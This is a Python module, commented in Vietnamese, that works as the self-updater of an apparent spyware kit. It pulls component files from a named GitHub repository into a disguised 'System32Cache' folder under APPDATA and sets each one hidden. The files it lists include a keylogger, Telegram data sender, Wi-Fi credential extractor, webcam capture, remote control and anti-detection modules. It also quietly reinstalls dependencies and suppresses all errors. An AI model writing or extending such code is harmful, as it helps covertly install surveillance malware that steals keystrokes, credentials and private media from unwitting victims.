"""
Module tự động cập nhật từ GitHub
"""
import os
import sys
import subprocess
import requests
import hashlib
from pathlib import Path


class Updater:
    def __init__(self, github_user=None, github_repo=None):
        """
        Khởi tạo updater
        
        Args:
            github_user: Username GitHub
            github_repo: Tên repository
        """
        self.github_user = github_user or "truongxoantit"
        self.github_repo = github_repo or "TLe1"
        self.base_url = f"https://raw.githubusercontent.com/{self.github_user}/{self.github_repo}/main"
        self.install_dir = os.path.join(
            os.environ.get('APPDATA', ''),
            'Microsoft', 'Windows', 'System32Cache'
        )
        self.files_to_update = [
            'main_stealth.py',
            'screen_recorder.py',
            'keylogger.py',
            'telegram_sender.py',
            'file_manager.py',
            'stealth.py',
            'hotkey_listener.py',
            'internet_checker.py',
            'performance_optimizer.py',
            'anti_detection.py',
            'updater.py',
            'data_manager.py',
            'clipboard_monitor.py',
            'screenshot_capture.py',
            'file_collector.py',
            'process_monitor.py',
            'machine_id.py',
            'remote_control.py',
            'file_receiver.py',
            'wifi_extractor.py',
            'webcam_capture.py',
            'usb_monitor.py',
            'config.py'
        ]
    
    def get_file_hash(self, file_path):
        """Tính hash MD5 của file"""
        try:
            if not os.path.exists(file_path):
                return None
            with open(file_path, 'rb') as f:
                return hashlib.md5(f.read()).hexdigest()
        except Exception:
            return None
    
    def download_file(self, filename):
        """Tải file từ GitHub"""
        try:
            url = f"{self.base_url}/{filename}"
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                return response.text
        except Exception:
            pass
        return None
    
    def check_update(self):
        """Kiểm tra có bản cập nhật không"""
        try:
            # Kiểm tra file version hoặc config
            config_file = os.path.join(self.install_dir, 'config.py')
            if os.path.exists(config_file):
                remote_config = self.download_file('config.py')
                if remote_config:
                    local_hash = self.get_file_hash(config_file)
                    remote_hash = hashlib.md5(remote_config.encode()).hexdigest()
                    if local_hash != remote_hash:
                        return True
        except Exception:
            pass
        return False
    
    def update_file(self, filename):
        """Cập nhật một file"""
        try:
            content = self.download_file(filename)
            if content:
                file_path = os.path.join(self.install_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(content)
                # Ẩn file sau khi cập nhật
                import ctypes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                ctypes.windll.kernel32.SetFileAttributesW(
                    file_path,
                    FILE_ATTRIBUTE_HIDDEN
                )
                return True
        except Exception:
            pass
        return False
    
    def update_all(self):
        """Cập nhật tất cả file"""
        updated_count = 0
        for filename in self.files_to_update:
            if self.update_file(filename):
                updated_count += 1
        return updated_count
    
    def auto_update(self):
        """Tự động kiểm tra và cập nhật"""
        try:
            if self.check_update():
                # Cập nhật các file
                self.update_all()
                # Cài đặt lại requirements nếu có thay đổi
                requirements_file = os.path.join(self.install_dir, 'requirements.txt')
                if os.path.exists(requirements_file):
                    subprocess.run([
                        sys.executable, '-m', 'pip', 'install', '-r', requirements_file,
                        '--quiet', '--disable-pip-version-check'
                    ], capture_output=True, check=False)
                return True
        except Exception:
            pass
        return False


if __name__ == "__main__":
    updater = Updater()
    print("Đang kiểm tra cập nhật...")
    if updater.check_update():
        print("Có bản cập nhật mới!")
        print(f"Đã cập nhật {updater.update_all()} file")
    else:
        print("Đã là phiên bản mới nhất")

